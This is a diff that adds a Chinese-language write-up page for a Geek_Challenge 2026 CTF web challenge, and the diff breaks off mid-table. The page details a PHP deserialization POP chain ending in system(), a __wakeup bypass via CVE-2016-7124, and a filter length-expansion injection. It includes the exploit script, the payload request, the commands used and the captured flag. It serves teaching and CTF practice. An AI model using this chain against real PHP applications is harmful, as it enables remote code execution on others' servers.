@@ -2666,6 +2666,493 @@
           <li class="md-meta__item">
             分类于
             
+              <a href="category/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" class="md-meta__link">反序列化</a>, 
+              <a href="category/pop-%E9%93%BE/" class="md-meta__link">POP 链</a></li>
+        
+        
+          
+          <li class="md-meta__item">
+            
+              需要 6 分钟阅读时间
+            
+          </li>
+        
+        
+      </ul>
+      
+    </div>
+  </header>
+  <div class="md-post__content md-typeset">
+    <h2 id="geek_challenge2026-pop"><a class="toclink" href="geek2026-pop-chain/">Geek_Challenge2026 — POP 链与长度扩张绕过</a></h2>
+<blockquote>
+<p><strong>题目类型</strong>：Web — PHP 反序列化（POP 链）+ 过滤后长度扩张</p>
+<p><strong>题目地址</strong>：Geek_Challenge 2026（实例已关闭）</p>
+<p><strong>Flag</strong>：<code>SYC{82a8d7ba-d362-4f0e-a49c-22abe6a72b32}</code></p>
+</blockquote>
+<hr />
+<h3 id="_1"><a class="toclink" href="geek2026-pop-chain/#_1">题目概述</a></h3>
+<p>题目接收 <code>user</code> 和 <code>sign</code> 两个参数，把它们塞进 A 类后序列化、过一遍过滤器，再反序列化：</p>
+<div class="language-php highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="x">$entry = new A($u, $s);</span>
+</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a><span class="x">$ser = serialize($entry);</span>
+</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a><span class="x">$escaped = filter($ser);</span>
+</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a><span class="x">unserialize($escaped);</span>
+</span></code></pre></div>
+<p>过滤器只有一句话：</p>
+<div class="language-php highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="x">function filter($data) {</span>
+</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a><span class="x">    return str_replace("admin", "hacker", $data);</span>
+</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a><span class="x">}</span>
+</span></code></pre></div>
+<p><code>admin</code> 5 个字符，<code>hacker</code> 6 个字符 —— <strong>每替换一次，字符串就多一个字节，但序列化串里的长度数字不会跟着变。</strong></p>
+<p>七个类的骨架（完整源码见文末）：</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>A  __destruct  →  echo "…" . $this-&gt;sign          （把对象当字符串拼接）
+</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a>B  __toString  →  (string)$func()                 （把对象当函数调用）
+</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a>C  __invoke    →  $this-&gt;target-&gt;$m()             （调用不存在的方法）
+</span><span id="__span-2-4"><a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a>D  __call      →  return $this-&gt;next-&gt;$p          （读取不存在的属性）
+</span><span id="__span-2-5"><a id="__codelineno-2-5" name="__codelineno-2-5" href="#__codelineno-2-5"></a>E  __get       →  $sink-&gt;flag_trigger = $cmd      （写私有属性）
+</span><span id="__span-2-6"><a id="__codelineno-2-6" name="__codelineno-2-6" href="#__codelineno-2-6"></a>F  __set       →  system($value)                  ← 代码执行在这里
+</span></code></pre></div>
+<hr />
+<h3 id="_2"><a class="toclink" href="geek2026-pop-chain/#_2">解题过程</a></h3>
+<h4 id="step-1"><a class="toclink" href="geek2026-pop-chain/#step-1">Step 1：先找能执行代码的地方</a></h4>
+<p><strong>审计代码，先找能执行代码的地方，然后倒着推。</strong></p>
+<p>全文只有一个真正的执行点：</p>
+<div class="language-php highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="x">class F {</span>
+</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a><span class="x">    private $flag_trigger;</span>
+</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a><span class="x">    public function __set($name, $value) {</span>
+</span><span id="__span-3-4"><a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a><span class="x">        if ($name !== 'flag_trigger') return;</span>
+</span><span id="__span-3-5"><a id="__codelineno-3-5" name="__codelineno-3-5" href="#__codelineno-3-5"></a><span class="x">        echo "RCE:&lt;br&gt;";</span>
+</span><span id="__span-3-6"><a id="__codelineno-3-6" name="__codelineno-3-6" href="#__codelineno-3-6"></a><span class="x">        system($value);          // ← 终点</span>
+</span><span id="__span-3-7"><a id="__codelineno-3-7" name="__codelineno-3-7" href="#__codelineno-3-7"></a><span class="x">    }</span>
+</span><span id="__span-3-8"><a id="__codelineno-3-8" name="__codelineno-3-8" href="#__codelineno-3-8"></a><span class="x">}</span>
+</span></code></pre></div>
+<p>所以要满足两个条件：<code>$name === 'flag_trigger'</code>，且 <code>$value</code> 是我能控制的字符串。</p>
+<h4 id="step-2-f"><a class="toclink" href="geek2026-pop-chain/#step-2-f">Step 2：倒推 —— 谁能写 F 的私有属性</a></h4>
+<p><code>$flag_trigger</code> 是 <code>private</code>，从类外部写它就会触发 <code>__set</code>。谁在写它？看 E：</p>
+<div class="language-php highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="x">class E {</span>
+</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a><span class="x">    public $sink;</span>
+</span><span id="__span-4-3"><a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a><span class="x">    public $cmd;</span>
+</span><span id="__span-4-4"><a id="__codelineno-4-4" name="__codelineno-4-4" href="#__codelineno-4-4"></a><span class="x">    public function __get($name) {</span>
+</span><span id="__span-4-5"><a id="__codelineno-4-5" name="__codelineno-4-5" href="#__codelineno-4-5"></a><span class="x">        if (!($this-&gt;sink instanceof F)) return;</span>
+</span><span id="__span-4-6"><a id="__codelineno-4-6" name="__codelineno-4-6" href="#__codelineno-4-6"></a><span class="x">        $this-&gt;sink-&gt;flag_trigger = $this-&gt;cmd;   // ← 写私有属性</span>
+</span><span id="__span-4-7"><a id="__codelineno-4-7" name="__codelineno-4-7" href="#__codelineno-4-7"></a><span class="x">    }</span>
+</span><span id="__span-4-8"><a id="__codelineno-4-8" name="__codelineno-4-8" href="#__codelineno-4-8"></a><span class="x">}</span>
+</span></code></pre></div>
+<p><code>E::__get</code> 里写了 <code>$this-&gt;sink-&gt;flag_trigger</code> —— 只要 <code>sink</code> 是 F 的实例，就会走到 <code>__set</code>，<code>$value</code> 就是 <code>$this-&gt;cmd</code>。</p>
+<p><strong>所以 <code>cmd</code> 就是我的命令，从这里传进去。</strong></p>
+<h4 id="step-3-e"><a class="toclink" href="geek2026-pop-chain/#step-3-e">Step 3：倒推 —— 谁读 E 的不存在属性</a></h4>
+<p><code>__get</code> 是在<strong>访问不可访问属性</strong>时触发的。看 D：</p>
+<div class="language-php highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="x">class D {</span>
+</span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a><span class="x">    public $next;</span>
+</span><span id="__span-5-3"><a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a><span class="x">    public $property;</span>
+</span><span id="__span-5-4"><a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a><span class="x">    public function __call($name, $arguments) {</span>
+</span><span id="__span-5-5"><a id="__codelineno-5-5" name="__codelineno-5-5" href="#__codelineno-5-5"></a><span class="x">        if (!is_object($this-&gt;next) || !is_string($this-&gt;property)) return '';</span>
+</span><span id="__span-5-6"><a id="__codelineno-5-6" name="__codelineno-5-6" href="#__codelineno-5-6"></a><span class="x">        $p = $this-&gt;property;</span>
+</span><span id="__span-5-7"><a id="__codelineno-5-7" name="__codelineno-5-7" href="#__codelineno-5-7"></a><span class="x">        return $this-&gt;next-&gt;$p;      // ← 读 $next 的属性 $p</span>
+</span><span id="__span-5-8"><a id="__codelineno-5-8" name="__codelineno-5-8" href="#__codelineno-5-8"></a><span class="x">    }</span>
+</span><span id="__span-5-9"><a id="__codelineno-5-9" name="__codelineno-5-9" href="#__codelineno-5-9"></a><span class="x">}</span>
+</span></code></pre></div>
+<p><strong>只要 <code>property</code> 写成 E 里不存在的名字（比如 <code>flag</code>），<code>$this-&gt;next-&gt;$p</code> 就会触发 <code>E::__get</code>。</strong></p>
+<p>E 的两个属性是 <code>sink</code> 和 <code>cmd</code>，所以 <code>property</code> 不能是这两个 —— 我用的是 <code>flag</code>。</p>
+<h4 id="step-4-d"><a class="toclink" href="geek2026-pop-chain/#step-4-d">Step 4：倒推 —— 谁调 D 的不存在方法</a></h4>
+<p><code>__call</code> 在调用<strong>不存在的方法</strong>时触发。看 C：</p>
+<div class="language-php highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a><span class="x">class C {</span>
+</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a><span class="x">    public $target;</span>
+</span><span id="__span-6-3"><a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a><span class="x">    public $method;</span>
+</span><span id="__span-6-4"><a id="__codelineno-6-4" name="__codelineno-6-4" href="#__codelineno-6-4"></a><span class="x">    public function __invoke() {</span>
+</span><span id="__span-6-5"><a id="__codelineno-6-5" name="__codelineno-6-5" href="#__codelineno-6-5"></a><span class="x">        if (!is_object($this-&gt;target) || !is_string($this-&gt;method)) return '';</span>
+</span><span id="__span-6-6"><a id="__codelineno-6-6" name="__codelineno-6-6" href="#__codelineno-6-6"></a><span class="x">        if (!method_exists($this-&gt;target, '__call') || method_exists($this-&gt;target, $this-&gt;method)) return '';</span>
+</span><span id="__span-6-7"><a id="__codelineno-6-7" name="__codelineno-6-7" href="#__codelineno-6-7"></a><span class="x">        $m = $this-&gt;method;</span>
+</span><span id="__span-6-8"><a id="__codelineno-6-8" name="__codelineno-6-8" href="#__codelineno-6-8"></a><span class="x">        return $this-&gt;target-&gt;$m();      // ← 调 $target 的方法 $m</span>
+</span><span id="__span-6-9"><a id="__codelineno-6-9" name="__codelineno-6-9" href="#__codelineno-6-9"></a><span class="x">    }</span>
+</span><span id="__span-6-10"><a id="__codelineno-6-10" name="__codelineno-6-10" href="#__codelineno-6-10"></a><span class="x">}</span>
+</span></code></pre></div>
+<p>这里有个<strong>反向条件</strong>，最容易看错：</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>必须 method_exists($target, '__call')        → target 得是有 __call 的类（就是 D）
+</span><span id="__span-7-2"><a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a>必须 !method_exists($target, $method)        → 这个方法名不能真的存在
+</span></code></pre></div>
+<p><strong>所以 <code>method</code> 随便写一个 D 里没有的名字就行</strong>（我用 <code>flag</code>），这样才会落到 <code>__call</code>。</p>
+<h4 id="step-5"><a class="toclink" href="geek2026-pop-chain/#step-5">Step 5：倒推 —— 谁把对象当函数调用</a></h4>
+<p><code>__invoke</code> 在<strong>对象被当成函数调用</strong>时触发。看 B：</p>
+<div class="language-php highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a><span class="x">class B {</span>
+</span><span id="__span-8-2"><a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a><span class="x">    public $action;</span>
+</span><span id="__span-8-3"><a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a><span class="x">    public function __toString() {</span>
+</span><span id="__span-8-4"><a id="__codelineno-8-4" name="__codelineno-8-4" href="#__codelineno-8-4"></a><span class="x">        if (!is_object($this-&gt;action) || !method_exists($this-&gt;action, '__invoke')) return '';</span>
+</span><span id="__span-8-5"><a id="__codelineno-8-5" name="__codelineno-8-5" href="#__codelineno-8-5"></a><span class="x">        $func = $this-&gt;action;</span>
+</span><span id="__span-8-6"><a id="__codelineno-8-6" name="__codelineno-8-6" href="#__codelineno-8-6"></a><span class="x">        return (string)$func();          // ← 对象当函数调</span>
+</span><span id="__span-8-7"><a id="__codelineno-8-7" name="__codelineno-8-7" href="#__codelineno-8-7"></a><span class="x">    }</span>
+</span><span id="__span-8-8"><a id="__codelineno-8-8" name="__codelineno-8-8" href="#__codelineno-8-8"></a><span class="x">}</span>
+</span></code></pre></div>
+<p><strong><code>action</code> 放 C 的实例，<code>$func()</code> 就会触发 <code>C::__invoke</code>。</strong></p>
+<h4 id="step-6-b"><a class="toclink" href="geek2026-pop-chain/#step-6-b">Step 6：倒推 —— 谁把 B 当字符串</a></h4>
+<p><strong><code>__toString</code> 在对象被当做字符串处理时触发。</strong> 看 A：</p>
+<div class="language-php highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a><span class="x">class A {</span>
+</span><span id="__span-9-2"><a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a><span class="x">    public $user;</span>
+</span><span id="__span-9-3"><a id="__codelineno-9-3" name="__codelineno-9-3" href="#__codelineno-9-3"></a><span class="x">    public $sign;</span>
+</span><span id="__span-9-4"><a id="__codelineno-9-4" name="__codelineno-9-4" href="#__codelineno-9-4"></a><span class="x">    public function __destruct() {</span>
+</span><span id="__span-9-5"><a id="__codelineno-9-5" name="__codelineno-9-5" href="#__codelineno-9-5"></a><span class="x">        echo "Welcome to Geek_Challenge2026!&lt;br&gt;";</span>
+</span><span id="__span-9-6"><a id="__codelineno-9-6" name="__codelineno-9-6" href="#__codelineno-9-6"></a><span class="x">        echo "Profile signature: " . $this-&gt;sign . "&lt;br&gt;";   // ← 字符串拼接</span>
+</span><span id="__span-9-7"><a id="__codelineno-9-7" name="__codelineno-9-7" href="#__codelineno-9-7"></a><span class="x">    }</span>
+</span><span id="__span-9-8"><a id="__codelineno-9-8" name="__codelineno-9-8" href="#__codelineno-9-8"></a><span class="x">}</span>
+</span></code></pre></div>
+<p><strong><code>$this-&gt;sign</code> 用 <code>.</code> 拼接，把对象当字符串 —— 把 B 的实例放进去，就会触发 <code>B::__toString</code>。</strong></p>
+<p>到这里整条链就闭合了：</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>A::__destruct  →  B::__toString  →  C::__invoke  →  D::__call  →  E::__get  →  F::__set  →  system()
+</span></code></pre></div>
+<h4 id="step-7-pop"><a class="toclink" href="geek2026-pop-chain/#step-7-pop">Step 7：构造 pop 链</a></h4>
+<p><strong>这道题完全按照从上往下的顺序触发，所以正着讲就是 A → B → C → D → E → F。</strong></p>
+<p><img alt="构造链的脚本" src="../assets/images/geek2026-pop-chain/01-exploit-code.png" /></p>
+<div class="language-php highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a><span class="x">$a = new A();</span>
+</span><span id="__span-11-2"><a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a><span class="x">$a-&gt;user = 'admin';</span>
+</span><span id="__span-11-3"><a id="__codelineno-11-3" name="__codelineno-11-3" href="#__codelineno-11-3"></a><span class="x">$a-&gt;sign = new B();</span>
+</span><span id="__span-11-4"><a id="__codelineno-11-4" name="__codelineno-11-4" href="#__codelineno-11-4"></a><span class="x">$a-&gt;sign-&gt;action = new C();</span>
+</span><span id="__span-11-5"><a id="__codelineno-11-5" name="__codelineno-11-5" href="#__codelineno-11-5"></a><span class="x">$a-&gt;sign-&gt;action-&gt;target = new D();</span>
+</span><span id="__span-11-6"><a id="__codelineno-11-6" name="__codelineno-11-6" href="#__codelineno-11-6"></a><span class="x">$a-&gt;sign-&gt;action-&gt;method = 'flag';</span>
+</span><span id="__span-11-7"><a id="__codelineno-11-7" name="__codelineno-11-7" href="#__codelineno-11-7"></a><span class="x">$a-&gt;sign-&gt;action-&gt;target-&gt;next = new E();</span>
+</span><span id="__span-11-8"><a id="__codelineno-11-8" name="__codelineno-11-8" href="#__codelineno-11-8"></a><span class="x">$a-&gt;sign-&gt;action-&gt;target-&gt;property = 'flag';</span>
+</span><span id="__span-11-9"><a id="__codelineno-11-9" name="__codelineno-11-9" href="#__codelineno-11-9"></a><span class="x">$a-&gt;sign-&gt;action-&gt;target-&gt;next-&gt;sink = new F();</span>
+</span><span id="__span-11-10"><a id="__codelineno-11-10" name="__codelineno-11-10" href="#__codelineno-11-10"></a><span class="x">$a-&gt;sign-&gt;action-&gt;target-&gt;next-&gt;cmd = 'env';</span>
+</span></code></pre></div>
+<h4 id="step-8-__wakeup"><a class="toclink" href="geek2026-pop-chain/#step-8-__wakeup">Step 8：绕过 <code>__wakeup</code></a></h4>
+<p><strong>在反序列化时会先调用 <code>__wakeup</code>，然后它会把 <code>$this-&gt;action</code> 置为空：</strong></p>
+<div class="language-php highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a><span class="x">class B {</span>
+</span><span id="__span-12-2"><a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a><span class="x">    public function __wakeup() {</span>
+</span><span id="__span-12-3"><a id="__codelineno-12-3" name="__codelineno-12-3" href="#__codelineno-12-3"></a><span class="x">        echo "唉？你怎么醒了，回去吧你&lt;br&gt;";</span>
+</span><span id="__span-12-4"><a id="__codelineno-12-4" name="__codelineno-12-4" href="#__codelineno-12-4"></a><span class="x">        $this-&gt;action = null;      // ← 链从这里就断了</span>
+</span><span id="__span-12-5"><a id="__codelineno-12-5" name="__codelineno-12-5" href="#__codelineno-12-5"></a><span class="x">    }</span>
+</span><span id="__span-12-6"><a id="__codelineno-12-6" name="__codelineno-12-6" href="#__codelineno-12-6"></a><span class="x">}</span>
+</span></code></pre></div>
+<p><strong>所以这里最后输出序列化串的时候，记得把 B 的属性数加 1 绕过 <code>wakeup</code> 方法。</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a>实际只有 1 个属性，却写成 2      O:1:"B":2:{s:6:"action";O:1:"C":…}
+</span></code></pre></div>
+<p><strong>原理是 CVE-2016-7124：属性数大于实际个数时，PHP 会跳过 <code>__wakeup</code>。只在 PHP &lt; 5.6.25 / 7.0.10 有效 —— 这题能过，说明目标 PHP 就在这个范围内。</strong></p>
+<h4 id="step-9-192"><a class="toclink" href="geek2026-pop-chain/#step-9-192">Step 9：为什么是 192 —— 长度扩张</a></h4>
+<p>前面序列化一次、过滤一次，问题出在<strong>过滤改变了字符串长度，但长度数字没变</strong>。</p>
+<p><img alt="长度数字与注入串" src="../assets/images/geek2026-pop-chain/02-string-and-length.png" /></p>
+<p>设 <strong>A = <code>admin</code> 的个数</strong>，<strong>b = 注入的那串</strong>（<code>";s:4:"sign";O:1:"B":2:{…</code>）：</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a>过滤前   声明长度 N = 5A + len(b)
+</span><span id="__span-14-2"><a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a>过滤后   实际长度   = 6A + len(b)      （每个 admin 多 1 字节）
+</span><span id="__span-14-3"><a id="__codelineno-14-3" name="__codelineno-14-3" href="#__codelineno-14-3"></a>解析器   只读 N 个字节 → 落在 5A + len(b) 这个位置
+</span></code></pre></div>
+<p><strong>注入的 <code>";</code> 在 b 的开头，也就是过滤后的 <code>6A</code> 处。要让解析器正好读到这里，需要：</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a>5A + len(b) = 6A     →     A = len(b)
+</span></code></pre></div>
+<p><strong>所以「192」不是随便挑的 —— 它同时是 b 的长度和 admin 的个数。</strong></p>
+<p><strong>这也是为什么换命令的时候别忘记改 admin 的个数：命令变长，b 变长，A 就得跟着变。</strong></p>
+<blockquote>
+<p><strong>长度别自己数</strong>，用 <code>echo strlen($b)</code> 让 PHP 输出，我上面脚本里就是这么做的。</p>
+</blockquote>
+<h4 id="step-10-flag"><a class="toclink" href="geek2026-pop-chain/#step-10-flag">Step 10：执行拿 flag</a></h4>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a>?user=&lt;192 个 admin&gt;" ;s:4:"sign";O:1:"B":2:{…}&amp;sign=1
+</span></code></pre></div>
+<p><img alt="执行结果" src="../assets/images/geek2026-pop-chain/03-output-flag.png" /></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a>Welcome to Geek_Challenge2026!
+</span><span id="__span-17-2"><a id="__codelineno-17-2" name="__codelineno-17-2" href="#__codelineno-17-2"></a>？！强强？！
+</span><span id="__span-17-3"><a id="__codelineno-17-3" name="__codelineno-17-3" href="#__codelineno-17-3"></a>666，还有第二关
+</span><span id="__span-17-4"><a id="__codelineno-17-4" name="__codelineno-17-4" href="#__codelineno-17-4"></a>马上就到了
+</span><span id="__span-17-5"><a id="__codelineno-17-5" name="__codelineno-17-5" href="#__codelineno-17-5"></a>还有一步
+</span><span id="__span-17-6"><a id="__codelineno-17-6" name="__codelineno-17-6" href="#__codelineno-17-6"></a>RCE:
+</span><span id="__span-17-7"><a id="__codelineno-17-7" name="__codelineno-17-7" href="#__codelineno-17-7"></a>SYC{82a8d7ba-d362-4f0e-a49c-22abe6a72b32}
+</span></code></pre></div>
+<p><strong>注意两点：</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-18-1"><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a>① 输出里没有"唉？你怎么醒了" —— 说明 __wakeup 确实被跳过了
+</span><span id="__span-18-2"><a id="__codelineno-18-2" name="__codelineno-18-2" href="#__codelineno-18-2"></a>② 用 env 命令不一定能直接看到 flag，可以先 ls / 再 cat /f*，命令随便换，记得同步改 A
+</span></code></pre></div>
+<hr />
+<h3 id="_3"><a class="toclink" href="geek2026-pop-chain/#_3">解题思路总结</a></h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-19-1"><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a>审计源码，先找唯一的执行点：F::__set 里的 system($value)
+</span><span id="__span-19-2"><a id="__codelineno-19-2" name="__codelineno-19-2" href="#__codelineno-19-2"></a>  → 谁能写 F 的私有属性 → E::__get（写 flag_trigger）
+</span><span id="__span-19-3"><a id="__codelineno-19-3" name="__codelineno-19-3" href="#__codelineno-19-3"></a>    → 谁读 E 的不存在属性 → D::__call（读 $next-&gt;$p）
+</span><span id="__span-19-4"><a id="__codelineno-19-4" name="__codelineno-19-4" href="#__codelineno-19-4"></a>      → 谁调 D 的不存在方法 → C::__invoke（调 $target-&gt;$m）
+</span><span id="__span-19-5"><a id="__codelineno-19-5" name="__codelineno-19-5" href="#__codelineno-19-5"></a>        → 谁把对象当函数调 → B::__toString（(string)$func()）
+</span><span id="__span-19-6"><a id="__codelineno-19-6" name="__codelineno-19-6" href="#__codelineno-19-6"></a>          → 谁把 B 当字符串拼 → A::__destruct（echo "…" . $sign）
+</span><span id="__span-19-7"><a id="__codelineno-19-7" name="__codelineno-19-7" href="#__codelineno-19-7"></a>            → 链成型：A → B → C → D → E → F
+</span><span id="__span-19-8"><a id="__codelineno-19-8" name="__codelineno-19-8" href="#__codelineno-19-8"></a>              → 属性数 +1 跳过 __wakeup
+</span><span id="__span-19-9"><a id="__codelineno-19-9" name="__codelineno-19-9" href="#__codelineno-19-9"></a>                → admin 个数 = 注入串长度，让解析器读到注入的 ";
+</span><span id="__span-19-10"><a id="__codelineno-19-10" name="__codelineno-19-10" href="#__codelineno-19-10"></a>                  → system 执行 → env → flag
+</span></code></pre></div>
+<h4 id="_4"><a class="toclink" href="geek2026-pop-chain/#_4">漏洞原理</a></h4>
+<p><strong>① 魔术方法是"自动触发"的，不是被调用的</strong></p>
+<p><strong><code>__destruct</code> / <code>__toString</code> / <code>__invoke</code> / <code>__call</code> / <code>__get</code> / <code>__set</code> 都不需要显式调用 —— 只要你把对象放在那个位置，PHP 自己会触发。</strong></p>
+<p><strong>反序列化的价值就在于：我能完全控制每个属性的值和类型。</strong></p>
+<p><strong>② 每一层都有前置检查，但检查的是"类型"不是"意图"</strong></p>
+<table>
+<thead>
+<tr>
+<th>层</th>
+<th>检查什么</th>
+<th>怎么满足</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>B</td>
+<td><code>action</code> 是对象且<strong>有</strong> <code>__invoke</code></td>
+<td>放 C 的实例</td>
+</tr>
+<tr>
+<td>C</td>
+<td><code>target</code> 是对象、<code>method</code> 是字符串、<code>target</code> <strong>有</strong> <code>__call</code>、且<strong>没有</strong>同名方法</td>
+<td>放 D 的实例，方法名随便写</td>
+</tr>
+<tr>
+<td>D</td>
+<td><code>next</code> 是对象、<code>property</code> 是字符串</td>
+<td>放 E 的实例</td>
+</tr>
+<tr>
+<td>E</td>
+<td><code>sink</code> 是 F 的实例</td>
+<td>放 F 的实例</td>
+</tr>
+<tr>
+<td>F</td>
+<td><code>$name === 'flag_trigger'</code></td>
+<td>由 E 固定写入这个属性名</td>
+</tr>
+</tbody>
+</table>
+<p><strong>③ 长度扩张：过滤器和序列化器看到的长度不一样</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-20-1"><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a>serialize()  按"过滤前"的长度写进串
+</span><span id="__span-20-2"><a id="__codelineno-20-2" name="__codelineno-20-2" href="#__codelineno-20-2"></a>filter()     把 5 字节的 admin 换成 6 字节的 hacker
+</span><span id="__span-20-3"><a id="__codelineno-20-3" name="__codelineno-20-3" href="#__codelineno-20-3"></a>unserialize() 按串里写的长度去读 —— 读的位置被"多出来的字节"整体推后
+</span></code></pre></div>
+<p><strong>于是我可以控制"解析器停在哪" —— 停在注入的 <code>";</code> 上，后面那一串就成了新的结构。</strong></p>
+<h4 id="_5"><a class="toclink" href="geek2026-pop-chain/#_5">关键知识点</a></h4>
+<table>
+<thead>
+<tr>
+<th>知识点</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>找终点</td>
+<td>审计先找执行点（<code>system</code> / <code>eval</code> / <code>include</code> / <code>call_user_func</code>），再倒着推</td>
+</tr>
+<tr>
+<td>POP 链</td>
+<td>利用属性把对象串起来，靠魔术方法的自动触发一层层走到终点</td>
+</tr>
+<tr>
+<td>反向条件</td>
+<td><code>!method_exists($target, $method)</code> —— 要求方法名<strong>不存在</strong>，最容易看错</td>
+</tr>
+<tr>
+<td><code>__wakeup</code> 绕过</td>
+<td>序列化串里属性数写大于实际个数（CVE-2016-7124，PHP &lt; 5.6.25 / 7.0.10）</td>
+</tr>
+<tr>
+<td>长度扩张</td>
+<td>过滤器把短串换成长串，序列化串里的长度数字不变 → 解析位置错位</td>
+</tr>
+<tr>
+<td>长度对齐</td>
+<td><code>admin</code> 的个数必须等于注入串的长度，解析器才会正好停在注入的 <code>";</code> 上</td>
+</tr>
+<tr>
+<td>工具</td>
+<td>长度用 <code>strlen()</code> 输出，不要手数</td>
+</tr>
+</tbody>
+</table>
+<h5 id="php"><a class="toclink" href="geek2026-pop-chain/#php">PHP 魔术方法的触发时机</a></h5>
+<p><strong>（这段是原理的地基 —— 记住"在什么时机被自动调用"，POP 链就是按时机拼起来的。）</strong></p>
+<table>
+<thead>
+<tr>
+<th>方法</th>
+<th>触发时机</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>__construct()</code></td>
+<td>用于在创建对象时自动触发：当使用 <code>new</code> 关键字实例化一个类时，会自动调用该类的 <code>__construct()</code> 方法</td>
+</tr>
+<tr>
+<td><code>__destruct()</code></td>
+<td>用于在对象被销毁时自动触发：对象被销毁、引用计数减少为零时触发</td>
+</tr>
+<tr>
+<td><code>__sleep()</code></td>
+<td>序列化 <code>serialize()</code> 函数会检查类中是否存在一个魔术方法 <code>__sleep()</code>。如果存在，该方法会先被调用，然后才执行序列化操作。此功能可以用于清理对象，并返回一个包含对象中所有应被序列化的变量名称的数组</td>
+</tr>
+<tr>
+<td><code>__wakeup()</code></td>
+<td>用于在反序列化对象时自动调用：<code>unserialize()</code> 会检查是否存在一个 <code>__wakeup()</code> 方法，如果存在，则会先调用 <code>__wakeup()</code> 方法</td>
+</tr>
+<tr>
+<td><code>__toString()</code></td>
+<td>在对象被当做字符串处理时自动调用，比如 <code>echo</code>、<code>==</code>、<code>preg_match()</code></td>
+</tr>
+<tr>
+<td><code>__invoke()</code></td>
